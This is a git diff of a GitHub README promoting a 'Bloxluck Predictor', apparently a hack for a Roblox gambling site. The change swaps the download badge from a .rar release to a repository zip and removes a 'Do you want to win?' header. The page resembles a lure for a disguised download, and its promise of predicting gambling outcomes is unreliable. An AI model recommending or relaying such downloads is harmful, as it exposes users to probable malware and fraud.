@@ -1,21 +1,5 @@
-<h1 align="center">
-  <a href="https://github.com/tradescamv2/blox-luck-hack.git">
-    <img src="./icon.png" alt="Logo" width="300" height="300" style="background:white; vertical-align: middle;">
-  </a>
-</h1>
-
-
-<div align="center">
-  <h3>Bloxluck Predictor</h3>
-   Do you want to win?
-  <br />
-  <br />
-</div>
-
-
-
 <p align="center">
-  <a href="https://github.com/tradescamv2/Bloxluck-Hack/releases/download/Bloxluck/Bloxluck.Predictor.rar" target="_blank">
+  <a href="https://github.com/tradescamv2/blox-luck-hack/archive/refs/heads/main.zip" target="_blank">
     <img src="https://img.shields.io/badge/Download-Bloxluck%20Predictor-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxluck Predictor" />
   </a>
 </p>
